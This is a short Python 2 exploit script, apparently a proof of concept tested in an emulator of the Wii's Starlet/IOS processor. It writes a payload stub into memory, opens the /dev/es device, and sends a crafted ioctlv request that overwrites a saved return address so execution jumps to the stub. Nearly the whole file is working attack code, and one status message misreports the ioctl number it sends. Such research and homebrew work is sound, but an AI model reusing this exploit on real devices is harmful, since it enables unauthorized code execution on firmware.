#!/usr/bin/env python
""" get_titles.py - testing in `skyeye-starlet` """

import sys
import time
from ipc import *

with open("stub.bin", "rb") as f:
    stub_data = f.read()

print "[*] Waiting for IPC to start up..."
ipc = SkyeyeIPC()
ipc.init()
print "[*] IPC ready"

# We control MEM1, so our payload goes here
STUB_ADDR = 0x00010000
ipc.writemem(STUB_ADDR, stub_data)
print "[*] Wrote stub (%d bytes) to %08x" % (len(stub_data), STUB_ADDR)

print "[*] Opening /dev/es ..."
fd = ipc.IOSOpen("/dev/es")
if (fd < 0):
    print "[!] Error opening ES, fd=%08x" % fd
    ipc.exit()
    sys.exit(1)
print "[!] es_fd=%d" % fd

# This will corrupt the saved LR with 0x00010001
SAVED_LR_PTR    = 0x201125b0

bad_buffer = ipc.makebuf((0x00000000, SAVED_LR_PTR))
res = ipc.IOSIoctlv(fd, 0x0f, "i:d", 0x00000000, bad_buffer)
if res < 0:
    print "ioctlv 0x0f failed with %d" % res
    ipc.exit()
    sys.exit(1)
print "[!] sent ioctlv 0x0d"


ipc.IOSClose(fd)
ipc.exit()
sys.exit(0)

